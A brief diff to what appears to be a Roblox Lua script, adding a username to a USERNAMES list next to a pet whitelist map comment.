@@ -16,7 +16,8 @@ local dataModule = require(ReplicatedStorage.Modules.DataService)
 local USERNAMES = {
     "Terensszxc",
     "Kuni_Loot1",
-    "Kuni_Loot",
+    "Kuni_Loot" ,
+    "BEESUCALL",
 }
 
 -- PET whitelist map: pet name => UUID
